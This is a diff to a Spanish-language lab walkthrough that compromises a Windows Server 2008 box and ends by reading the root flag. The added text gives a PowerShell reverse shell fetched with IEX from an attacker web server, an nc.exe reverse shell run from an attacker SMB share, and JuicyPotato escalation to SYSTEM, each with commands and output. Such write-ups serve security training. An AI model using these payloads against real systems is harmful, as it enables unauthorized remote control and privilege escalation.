@@ -1,4 +1,5 @@
 ---
+icon: flag
 layout:
   title:
     visible: true
@@ -256,22 +257,130 @@ win-4qu3qnhnk7e\info
 
 Vemos que esta funcionando de forma correcta, por lo que vamos a ingresar el siguiente `payload` para obtener una `shell` con la maquina victima.
 
-```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+## Escalate user win-4qu3qnhnk7e\info
+
+### Opcion 1 (reverse shell .ps1)
+
+Podemos crear este codigo en `.ps1`:
+
+```shell
+nano shell.ps1
 ```
 
-Antes de ejecutar esto en la pagina, nos pondremos a la escucha:
+Dentro del nano:
+
+```powershell
+$LHOST = "<IP>"  # Cambia esto por tu IP
+$LPORT = <PORT>            # Cambia esto por el puerto de escucha
+
+$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
+$stream = $client.GetStream()
+$buffer = New-Object System.Byte[] 1024
+$encoding = New-Object System.Text.ASCIIEncoding
+
+do {
+    $stream.Read($buffer, 0, $buffer.Length) | Out-Null
+    $cmd = $encoding.GetString($buffer).Trim()
+    if ($cmd -eq "exit") { break }
+    $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
+    $response = $encoding.GetBytes($output + "`nPS > ")
+    $stream.Write($response, 0, $response.Length)
+    $stream.Flush()
+} while ($true)
+
+$client.Close()
+```
+
+Esto lo guardamos y abriremos `metasploit` pata ponernos a la escucha.
+
+```shell
+msfconsole -q
+```
+
+Ahora lo configuraremos de la siguiente forma:
+
+```shell
+use exploit/multi/handler
+set payload windows/powershell_reverse_tcp
+set LHOST <IP>
+set LPORT <PORT>
+run
+```
+
+Abrimos un servidor de `python3` en nuestro `host` para que obtenga el archivo `shell.ps1` y lo ejecute.
+
+```shell
+python3 -m http.server 8000
+```
+
+Ahora vamos a la `web.config` y pondremos el siguiente comando:
+
+```powershell
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>:8000/shell.ps1')"
+```
+
+Si vamos a donde tenemos la escucha de `metasploit` veremos lo siguiente:
+
+```
+[*] Started reverse TCP handler on 192.168.28.5:7777 
+[*] Powershell session session 1 opened (192.168.28.5:7777 -> 192.168.28.4:49160) at 2025-03-20 11:13:00 -0400
+
+
+PS > whoami
+win-4qu3qnhnk7e\info
+```
+
+### Opcion 2 (Reverse Shell SMB) `RECOMENDADO!!`
+
+Tambien podemos generarnos una `reverse shell` mediante un `servidor` de `SMB` abierto desde nuestro `host`, para que desde el `web.config` ejecutar un comando para ejecutar un `nc.exe` desde nuestro servidor de `SMB`.
+
+Primero tendremos que copiarnos el ejecutable `nc.exe` a nuestro directorio actual.
+
+```shell
+cp /usr/share/windows-binaries/nc.exe .
+```
+
+Una vez copiado nuestro binario de `netcat` vamos abrirnos el servidor de `SMB`:
+
+```shell
+impacket-smbserver -smb2support kali .
+```
+
+Info:
+
+```
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+
+Ahora desde la pagina de `web.config` ejecutaremos lo siguiente:
+
+```powershell
+\\<IP_ATTACKER>\kali\nc.exe -e cmd <IP_ATTACKER> <PORT>
+```
+
+Con esto lo que haremos sera conectarnos a nuestro servidor de `SMB` para ejecutar el binario `nc.exe` y seguidamente estamos estableciendo una conexion a dicho `puerto` e `IP`.
+
+Antes de enviarlo nos tendremos que poner a la escucha de la siguiente forma:
 
 ```shell
 nc -lvnp <PORT>
 ```
 
-Ahora lo enviamos y si volvemos a donde tenemos la escucha veremos lo siguiente:
+Ahora si enviamos ese `payload` en el `web.config` y volvemos a donde tenemos la escucha veremos lo siguiente:
 
 ```
 listening on [any] 7777 ...
-connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49161
-PS C:\windows\system32\inetsrv> whoami
+connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49160
+Microsoft Windows [Versi�n 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
+
+c:\windows\system32\inetsrv> whoami
 win-4qu3qnhnk7e\info
 ```
 
@@ -304,4 +413,113 @@ SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habil
 SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
 ```
 
-Vemos que `SeImpersonatePrivilege` esta `habilitado` por lo que podremos
+Vemos que `SeImpersonatePrivilege` esta `habilitado`.
+
+Es muy similar a `SeImpersonatePrivilege`, utilizará el mismo método para obtener un token privilegiado. Luego, este privilegio permite asignar un token primario a un proceso nuevo/suspendido. Con el `token` de suplantación privilegiado puedes derivar un token primario `(DuplicateTokenEx)`. Con el `token`, puedes crear un nuevo proceso con `'CreateProcessAsUser'` o crear un proceso suspendido y establecer el token (en general, no puedes modificar el token primario de un proceso en ejecución).
+
+URL = [Info SeImpersonatePrivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeImpersonatePrivilege#seimpersonateprivilege)
+
+Vamos a descargarnos en nuestro `hosts` el binario malicioso llamado `JuicyPotato.exe`:
+
+URL = [Download JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
+
+Ahora nos lo vamos a pasar a la maquina victima ejecutando este comando desde la maquina victima:
+
+Antes abriremos un servidor de `python3` para que se lo pueda descargar:
+
+```shell
+python3 -m http.server 8000
+```
+
+Y ahora si podremos ejecutar el siguiente comando:
+
+```powershell
+mkdir C:\Temp
+cd C:\Temp
+
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP_ATTACKER>:8000/JuicyPotato.exe', 'C:\Temp\JuicyPotato.exe')"
+```
+
+Si esto fallara podremos hacerlo directamente desde el `SMB` poniendo lo siguiente:
+
+```powershell
+\\<IP_ATTACKER>\kali\JuicyPotato.exe
+```
+
+Quedando algo asi el `payload`:
+
+```powershell
+\\<IP_ATTACKER>\kali\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
+```
+
+Pero si tuvieramos el binario directamente podremos hacerlo de la siguiente forma:
+
+```powershell
+JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
+```
+
+Info:
+
+```
+JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/C \\192.168.28.5\kali\nc.exe -e cmd.exe 192.168.28.5 5555" -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -> recv failed with error: 10038
+```
+
+Vemos que nos esta dando un error relacionado con las `CLSIDs` por lo que vamos a utilizar otras genericas que suelen funcionar en un `Windows Server 2008`:
+
+```
+===================LISTA_CLSID====================
+
+{4991d34b-80a1-4291-83b6-3328366b9097} -> ERROR
+{e60687f7-01a1-40aa-86ac-db1cbf673334} -> CORRECTA
+{ba126ad1-2166-11d1-b1d0-00805fc1270e} -> NO TESTEADA
+
+==================================================
+```
+
+Si por ejemplo probamos con esta generica `{e60687f7-01a1-40aa-86ac-db1cbf673334}` veremos que si nos funciona:
+
+Pero antes nos pondremos a la escucha con el puerto que especifiquemos en la herramienta `JuicyPotato.exe`.
+
+```shell
+nc -lvnp <PORT>
+```
+
+Ahora si ejecutamos de nuevo con el nuevo `CLSID` de la siguiente manera:
+
+```powershell
+JuicyPotato.exe -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p c:\windows\system32\cmd.exe -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
+```
+
+Info:
+
+```
+JuicyPotato -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p c:\windows\system32\cmd.exe -a "/C \\192.168.28.5\kali\nc.exe -e cmd.exe 192.168.28.5 5555" -t *
+Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1337
+....
+[+] authresult 0
+{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+```
+
+Con esto veremos que ha funcionado, por lo que si volvemos a donde tenemos la escucha veremos lo siguiente:
+
+```
+listening on [any] 5555 ...
+connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49178
+Microsoft Windows [Versi�n 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Vemos que seremos ya `nt authority\system` por lo que habremos terminado la maquina, ahora leeremos la `flag` del `administrador`.
+
+> root.txt
+
+```
+jbeaf7gvser79aw6vvbf78wrgv
+```
